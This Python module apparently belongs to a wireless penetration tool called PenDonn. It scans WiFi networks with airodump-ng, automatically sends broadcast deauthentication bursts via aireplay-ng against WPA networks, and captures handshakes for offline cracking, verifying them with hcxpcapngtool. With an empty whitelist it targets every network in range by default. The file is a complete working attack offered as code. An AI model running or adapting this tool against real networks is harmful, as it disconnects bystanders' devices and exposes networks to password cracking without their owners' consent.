"""
PenDonn WiFi Scanner Module
Uses airodump-ng for reliable network detection - inspired by Wifite/Fluxion approach
"""

import os
import time
import csv
import subprocess
import threading
import logging
from datetime import datetime
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)


class WiFiScanner:
    """WiFi scanning using airodump-ng (more reliable than Scapy)"""
    
    def __init__(self, config: Dict, database):
        """Initialize WiFi scanner"""
        self.config = config
        self.db = database
        
        # Auto-detect WiFi interface
        self.management_mac = "dc:a6:32:9e:ea:ba"
        detected = self._detect_wifi_interfaces()
        
        if not detected:
            raise Exception("No external WiFi adapter found!")
        
        self.interface = detected[0]  # Use first external adapter (monitor)
        self.attack_interface = detected[1] if len(detected) >= 2 else detected[0]  # Use second adapter for attack if available
        logger.info(f"Using WiFi interface: {self.interface}")
        logger.info(f"Using attack interface: {self.attack_interface}")
        
        self.whitelist_ssids = set(config['whitelist']['ssids'])
        self.running = False
        
        # Scan results
        self.networks = {}  # bssid -> network_info
        self.scan_dir = "./scan_results"
        os.makedirs(self.scan_dir, exist_ok=True)
        
        # Active handshake captures
        self.active_captures = {}
        self.handshake_dir = "./handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        
        self.handshake_timeout = config['wifi']['handshake_timeout']
        
        if self.whitelist_ssids:
            logger.info(f"Whitelist active: {list(self.whitelist_ssids)}")
        else:
            logger.warning("Whitelist EMPTY - will attack ALL networks!")
    
    def _detect_wifi_interfaces(self) -> List[str]:
        """Detect external WiFi adapters"""
        try:
            result = subprocess.run(['ip', 'link', 'show'], 
                                  capture_output=True, text=True, check=True)
            
            interfaces = []
            current_iface = None
            
            for line in result.stdout.split('\n'):
                # Look for interface lines like "3: wlan0: <...>"
                if ': wlan' in line and '<' in line:
                    parts = line.split(': ')
                    if len(parts) >= 2:
                        current_iface = parts[1].split(':')[0].split('@')[0]
                        
                # Look for MAC address on following line (both ether and radiotap)
                elif ('link/ether' in line or 'link/ieee802.11' in line) and current_iface:
                    parts = line.strip().split()
                    # Get MAC address (second field after link type)
                    if len(parts) >= 2:
                        mac = parts[1].lower()
                        
                        # Exclude management interface by MAC
                        if mac != self.management_mac.lower():
                            interfaces.append(current_iface)
                            logger.info(f"Found external WiFi: {current_iface} ({mac})")
                        else:
                            logger.info(f"Skipping management interface: {current_iface} ({mac})")
                    
                    current_iface = None
            
            return interfaces
        except Exception as e:
            logger.error(f"Interface detection failed: {e}")
            return []
    
    def start(self):
        """Start WiFi scanner"""
        logger.info("Starting WiFi scanner...")
        
        # Enable monitor mode
        self._enable_monitor_mode(self.interface)
        
        self.running = True
        
        # Start scanning thread
        scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        scan_thread.start()
        
        # Start capture monitor thread
        monitor_thread = threading.Thread(target=self._capture_monitor, daemon=True)
        monitor_thread.start()
        
        logger.info("✓ WiFi scanner started")
    
    def stop(self):
        """Stop WiFi scanner"""
        logger.info("Stopping WiFi scanner...")
        self.running = False
        
        # Stop all active captures
        for bssid in list(self.active_captures.keys()):
            self._stop_capture(bssid)
        
        time.sleep(2)
        logger.info("WiFi scanner stopped")
    
    def _enable_monitor_mode(self, interface: str):
        """Enable monitor mode on interface"""
        try:
            logger.info(f"Enabling monitor mode on {interface}...")
            
            # DON'T kill interfering processes - this kills NetworkManager and breaks SSH!
            # subprocess.run(['airmon-ng', 'check', 'kill'], 
            #              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Enable monitor mode
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iw', interface, 'set', 'monitor', 'none'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            
            logger.info(f"✓ Monitor mode enabled on {interface}")
        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            raise
    
    def _scan_loop(self):
        """Continuous scanning loop using airodump-ng"""
        logger.info("Starting continuous WiFi scan...")
        
        while self.running:
            try:
                # Run airodump-ng scan for 10 seconds
                scan_file = os.path.join(self.scan_dir, f"scan_{int(time.time())}")
                
                logger.debug(f"Running 10-second scan on {self.interface}...")
                
                # Start airodump-ng in background mode
                # --output-format csv: CSV output only
                # -w: write to file
                # Scan both 2.4GHz (1-13) and 5GHz (36-165) channels
                process = subprocess.Popen([
                    'airodump-ng',
                    '--output-format', 'csv',
                    '-w', scan_file,
                    '--band', 'abg',  # a=5GHz, b/g=2.4GHz
                    self.interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Let it scan for 10 seconds
                time.sleep(10)
                
                # Stop airodump-ng
                process.terminate()
                process.wait(timeout=5)
                
                # Parse results
                self._parse_scan_results(scan_file + '-01.csv')
                
                # Clean up old scan files (keep last 5)
                self._cleanup_old_scans()
                
            except Exception as e:
                logger.error(f"Scan error: {e}")
                time.sleep(5)
    
    def _parse_scan_results(self, csv_file: str):
        """Parse airodump-ng CSV output"""
        try:
            if not os.path.exists(csv_file):
                logger.warning(f"Scan file not found: {csv_file}")
                return
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # airodump CSV has two sections: APs and Clients
            # We only care about APs (networks)
            sections = content.split('\r\n\r\n')
            if not sections:
                return
            
            # First section is APs
            ap_lines = sections[0].split('\n')
            
            # Find header line (starts with "BSSID")
            header_idx = None
            for i, line in enumerate(ap_lines):
                if line.strip().startswith('BSSID'):
                    header_idx = i
                    break
            
            if header_idx is None:
                return
            
            # Parse CSV
            reader = csv.DictReader(ap_lines[header_idx:], delimiter=',', skipinitialspace=True)
            
            networks_found = 0
            for row in reader:
                try:
                    bssid = row.get('BSSID', '').strip()
                    essid = row.get('ESSID', '').strip()
                    channel = row.get('channel', '').strip()
                    encryption = row.get('Privacy', '').strip()
                    power = row.get('Power', '').strip()
                    
                    if not bssid or not essid:
                        continue
                    
                    # Parse encryption
                    enc_type = self._parse_encryption(encryption, row)
                    
                    # Parse signal strength
                    try:
                        signal = int(power) if power and power != '-1' else -100
                    except:
                        signal = -100
                    
                    # Parse channel
                    try:
                        channel_num = int(channel) if channel and channel != '-1' else 0
                    except:
                        channel_num = 0
                    
                    # Update or add network
                    if bssid not in self.networks:
                        self.networks[bssid] = {
                            'ssid': essid,
                            'bssid': bssid,
                            'channel': channel_num,
                            'encryption': enc_type,
                            'signal': signal,
                            'last_seen': datetime.now()
                        }
                        
                        # Add to database
                        network_id = self.db.add_network(essid, bssid, channel_num, enc_type, signal)
                        self.networks[bssid]['id'] = network_id
                        
                        # Set whitelist flag (True if in whitelist, False otherwise)
                        if self.whitelist_ssids:
                            is_whitelisted = essid in self.whitelist_ssids
                            self.db.set_whitelist(bssid, is_whitelisted)
                        
                        logger.info(f"✓ Found: {essid} ({bssid}) CH:{channel_num} {enc_type} {signal}dBm")
                        networks_found += 1
                    else:
                        # Update existing
                        self.networks[bssid].update({
                            'signal': signal,
                            'last_seen': datetime.now(),
                            'channel': channel_num,
                            'encryption': enc_type
                        })
                        self.db.add_network(essid, bssid, channel_num, enc_type, signal)
                        
                        # Update whitelist flag (True if in whitelist, False otherwise)
                        if self.whitelist_ssids:
                            is_whitelisted = essid in self.whitelist_ssids
                            self.db.set_whitelist(bssid, is_whitelisted)
                    
                    # Start handshake capture if WPA/WPA2 and in whitelist (or whitelist empty)
                    if 'WPA' in enc_type and bssid not in self.active_captures:
                        # Only attack if no whitelist or network is in whitelist
                        if not self.whitelist_ssids or essid in self.whitelist_ssids:
                            self._start_handshake_capture(bssid, essid, channel_num)
                        else:
                            logger.debug(f"Network {essid} discovered but not attacking - not in whitelist")
                
                except Exception as e:
                    logger.debug(f"Error parsing network row: {e}")
            
            if networks_found > 0:
                logger.info(f"📡 Scan complete: {networks_found} new network(s) found")
        
        except Exception as e:
            logger.error(f"Failed to parse scan results: {e}")
    
    def _parse_encryption(self, privacy: str, row: Dict) -> str:
        """Parse encryption type from airodump output"""
        # airodump Privacy column examples: "WPA2", "WPA", "WEP", "OPN"
        # Authentication column has details: "PSK", "MGT", etc.
        
        if not privacy or privacy == 'OPN':
            return "Open"
        
        auth = row.get('Authentication', '').strip()
        cipher = row.get('Cipher', '').strip()
        
        if 'WPA2' in privacy:
            return "WPA2"
        elif 'WPA' in privacy:
            if 'WPA2' in auth:
                return "WPA/WPA2"
            return "WPA"
        elif 'WEP' in privacy:
            return "WEP"
        else:
            return privacy if privacy else "Unknown"
    
    def _cleanup_old_scans(self):
        """Remove old scan files, keep last 5"""
        try:
            scan_files = sorted([
                f for f in os.listdir(self.scan_dir) 
                if f.startswith('scan_')
            ])
            
            # Remove all but last 5
            for old_file in scan_files[:-5]:
                try:
                    os.remove(os.path.join(self.scan_dir, old_file))
                except:
                    pass
        except:
            pass
    
    def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
        """Start capturing handshake for a network"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            bssid_clean = bssid.replace(':', '')
            capture_base = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}")
            
            logger.info(f"⚡ Starting handshake capture: {ssid} CH:{channel}")
            
            # Start airodump-ng to capture handshake
            # Capture ALL traffic on the channel (no filters!)
            # Filters exclude critical frames needed for hash conversion
            # We'll verify with hcxpcapngtool (more reliable than aircrack-ng)
            # --write-interval: force writes every second to ensure all frames captured
            cmd = [
                'airodump-ng',
                '--channel', str(channel),
                '--write', capture_base,
                '--output-format', 'cap',  # cap format (airodump ignores pcap anyway)
                '--write-interval', '1',  # Write every second to capture all frames
                self.interface
            ]
            
            process = subprocess.Popen(cmd, 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
            
            # Wait and verify process started
            time.sleep(2)
            if process.poll() is not None:
                logger.error(f"Failed to start capture for {ssid}")
                return
            
            # Airodump creates -01.cap file regardless of format setting
            capture_file = capture_base + '-01.cap'
            
            self.active_captures[bssid] = {
                'ssid': ssid,
                'channel': channel,
                'process': process,
                'capture_file': capture_file,
                'start_time': time.time(),
                'deauth_sent': False
            }
            
            logger.info(f"✓ Capturing {ssid} -> {os.path.basename(capture_file)}")
            
            # Send deauth after 5 seconds
            threading.Thread(target=self._send_deauth_delayed, 
                           args=(bssid, channel), daemon=True).start()
        
        except Exception as e:
            logger.error(f"Failed to start capture for {ssid}: {e}")
    
    def _send_deauth_delayed(self, bssid: str, channel: int):
        """Send deauth packets after delay"""
        time.sleep(5)
        
        if bssid not in self.active_captures:
            return
        
        capture_info = self.active_captures[bssid]
        ssid = capture_info['ssid']
        
        try:
            logger.info(f"💥 Sending deauth to {ssid}...")
            
            # Set attack interface to correct channel
            try:
                channel_result = subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
                             capture_output=True, text=True, timeout=5)
                if channel_result.returncode == 0:
                    logger.debug(f"Set {self.attack_interface} to channel {channel}")
                else:
                    logger.warning(f"Failed to set channel {channel}: {channel_result.stderr[:200]}")
            except Exception as e:
                logger.warning(f"Could not set channel on attack interface: {e}")
            
            # Verify interface is in monitor mode before attempting deauth
            try:
                mode_check = subprocess.run(['iw', 'dev', self.attack_interface, 'info'],
                                          capture_output=True, text=True, timeout=5)
                if 'type monitor' not in mode_check.stdout.lower():
                    logger.error(f"{self.attack_interface} is not in monitor mode! Attempting to fix...")
                    subprocess.run(['ip', 'link', 'set', self.attack_interface, 'down'], timeout=5)
                    subprocess.run(['iw', self.attack_interface, 'set', 'monitor', 'control'], timeout=5)
                    subprocess.run(['ip', 'link', 'set', self.attack_interface, 'up'], timeout=5)
                    time.sleep(1)
                else:
                    logger.debug(f"{self.attack_interface} is in monitor mode")
            except Exception as e:
                logger.warning(f"Could not verify/fix monitor mode: {e}")
            
            logger.debug(f"Starting aireplay-ng: BSSID={bssid}, CH={channel}, Interface={self.attack_interface}")
            
            # Send deauth packets to broadcast (all clients)
            # --deauth: number of deauth packets to send (increased to 20 for better coverage)
            # -a: AP MAC address
            # Using broadcast (FF:FF:FF:FF:FF:FF) to target all clients
            result = subprocess.run([
                'aireplay-ng',
                '--deauth', '20',
                '-a', bssid,
                self.attack_interface  # Use attack interface for deauth
            ], capture_output=True, text=True, timeout=30)
            
            logger.debug(f"aireplay-ng completed with returncode={result.returncode}")
            
            if result.returncode == 0:
                logger.info(f"✓ Deauth sent to {ssid}")
                capture_info['deauth_sent'] = True
                capture_info['deauth_time'] = time.time()  # Track when deauth was sent
                
                # Send a second burst after 10 seconds to catch clients that weren't active
                time.sleep(10)
                logger.info(f"💥 Sending follow-up deauth to {ssid}...")
                result2 = subprocess.run([
                    'aireplay-ng',
                    '--deauth', '20',
                    '-a', bssid,
                    self.attack_interface  # Use attack interface for follow-up deauth
                ], capture_output=True, text=True, timeout=30)
                if result2.returncode == 0:
                    logger.info(f"✓ Follow-up deauth sent to {ssid}")
            else:
                # Log the error with more detail
                error_msg = result.stderr.strip() if result.stderr else ""
                stdout_msg = result.stdout.strip() if result.stdout else ""
                full_output = error_msg + " " + stdout_msg
                
                # Check for critical failures
                if "No such BSSID available" in full_output:
                    logger.info(f"Network {ssid} not visible during deauth - may be temporarily offline")
                    # Don't immediately fail - mark deauth as sent and check for handshake anyway
                    # The network might have been visible briefly
                    capture_info['deauth_sent'] = True
                    capture_info['deauth_time'] = time.time()
                    capture_info['deauth_warning'] = True  # Mark that deauth had issues
                elif "ioctl(SIOCSIWMODE) failed" in full_output:
                    logger.debug(f"Interface busy for {ssid}, deauth may have partially succeeded")
                    capture_info['deauth_sent'] = True
                    capture_info['deauth_time'] = time.time()
                elif "Operation not permitted" in full_output:
                    logger.debug(f"Deauth temporarily unavailable for {ssid} (interface busy)")
                    capture_info['deauth_sent'] = True
                    capture_info['deauth_time'] = time.time()
                # Actual problems - warn but still try to check for handshake
                else:
                    if error_msg or stdout_msg:
                        logger.warning(f"Deauth failed for {ssid}: {full_output[:300]}, returncode={result.returncode}")
                    else:
                        logger.warning(f"Deauth failed for {ssid}: No output, returncode={result.returncode}")
                    
                    capture_info['deauth_sent'] = True
                    capture_info['deauth_time'] = time.time()
        
        except subprocess.TimeoutExpired:
            logger.error(f"Deauth timeout for {ssid} (aireplay-ng took too long)")
        except Exception as e:
            logger.error(f"Deauth error for {ssid}: {type(e).__name__}: {e}", exc_info=True)
    
    def _capture_monitor(self):
        """Monitor active captures and check for handshakes"""
        logger.info("Capture monitor started")
        
        while self.running:
            try:
                time.sleep(5)  # Check more frequently (every 5 seconds)
                
                for bssid in list(self.active_captures.keys()):
                    capture_info = self.active_captures[bssid]
                    elapsed = time.time() - capture_info['start_time']
                    ssid = capture_info['ssid']
                    
                    # Check if process is still alive
                    if capture_info['process'].poll() is not None:
                        logger.warning(f"Capture process died for {ssid}")
                        self._finalize_capture(bssid, success=False)
                        continue
                    
                    # Check for handshake
                    if capture_info.get('deauth_sent', False):
                        # Wait at least 10 seconds after deauth before first check
                        # Then check every 5 seconds
                        deauth_time = capture_info.get('deauth_time', 0)
                        time_since_deauth = time.time() - deauth_time
                        
                        if time_since_deauth < 10:
                            logger.debug(f"Waiting for {ssid} to reconnect ({int(time_since_deauth)}s)")
                            continue
                        
                        has_handshake = self._check_handshake(capture_info['capture_file'])
                        
                        if has_handshake:
                            logger.info(f"🎯 Handshake captured for {ssid}!")
                            self._finalize_capture(bssid, success=True)
                        elif elapsed > self.handshake_timeout:
                            # Extended timeout if deauth had warnings
                            timeout = self.handshake_timeout * 1.5 if capture_info.get('deauth_warning') else self.handshake_timeout
                            if elapsed > timeout:
                                logger.warning(f"❌ Timeout for {ssid} ({int(elapsed)}s)")
                                self._finalize_capture(bssid, success=False)
                        else:
                            # Only log every 30 seconds to avoid spam
                            if int(time_since_deauth) % 30 < 5:
                                logger.info(f"🔍 Checking {ssid} handshake ({int(elapsed)}s)")
                    elif elapsed > 30:
                        # Waiting too long for deauth to be sent
                        logger.warning(f"No deauth sent for {ssid} after {int(elapsed)}s, stopping")
                        self._finalize_capture(bssid, success=False)
            
            except Exception as e:
                logger.error(f"Capture monitor error: {e}")
    
    def _check_handshake(self, capture_file: str) -> bool:
        """Check if capture file contains valid handshake"""
        try:
            if not os.path.exists(capture_file):
                logger.warning(f"Capture file not found: {capture_file}")
                return False
            
            # Use hcxpcapngtool to verify - it's more reliable than aircrack-ng
            # It can detect PMKID and partial EAPOL handshakes
            test_output = '/tmp/test_' + os.path.basename(capture_file) + '.22000'
            
            logger.debug(f"Running hcxpcapngtool on {os.path.basename(capture_file)}...")
            result = subprocess.run([
                'hcxpcapngtool',
                '-o', test_output,
                capture_file
            ], capture_output=True, text=True, timeout=10)
            
            # Check if hash file was created and has content
            if os.path.exists(test_output) and os.path.getsize(test_output) > 0:
                logger.info(f"✓ Valid handshake hash created ({os.path.getsize(test_output)} bytes)")
                # Clean up test file
                try:
                    os.remove(test_output)
                except:
                    pass
                return True
            
            # Log why verification failed
            if 'no hashes written' in result.stdout.lower():
                logger.debug(f"No EAPOL frames in capture yet")
            else:
                logger.debug(f"hcxpcapngtool: {result.stdout[:200]}")
            
            return False
        
        except Exception as e:
            logger.debug(f"Handshake check error: {e}")
            return False
    
    def _finalize_capture(self, bssid: str, success: bool):
        """Finalize a handshake capture"""
        if bssid not in self.active_captures:
            return
        
        capture_info = self.active_captures[bssid]
        ssid = capture_info['ssid']
        
        # Stop airodump process
        try:
            capture_info['process'].terminate()
            capture_info['process'].wait(timeout=5)
        except:
            try:
                capture_info['process'].kill()
            except:
                pass
        
        if success:
            # Get network_id from database (network should already exist from scan)
            network_id = self.networks[bssid].get('id')
            
            # If not in memory, query database
            if not network_id:
                network = self.db.get_network_by_bssid(bssid)
                if network:
                    network_id = network['id']
                    self.networks[bssid]['id'] = network_id
            
            if network_id:
                self.db.add_handshake(
                    network_id=network_id,
                    bssid=bssid,
                    ssid=ssid,
                    file_path=capture_info['capture_file'],
                    quality='good'
                )
                logger.info(f"✅ Handshake saved: {ssid}")
            else:
                logger.warning(f"❌ Could not save handshake for {ssid}: network_id not found")
        else:
            # Clean up failed capture file
            try:
                if os.path.exists(capture_info['capture_file']):
                    os.remove(capture_info['capture_file'])
            except:
                pass
        
        # Remove from active captures
        del self.active_captures[bssid]
    
    def _stop_capture(self, bssid: str):
        """Stop an active capture"""
        if bssid in self.active_captures:
            self._finalize_capture(bssid, success=False)
    
    def get_statistics(self) -> Dict:
        """Get current statistics"""
        return {
            'networks_discovered': len(self.networks),
            'active_captures': len(self.active_captures)
        }
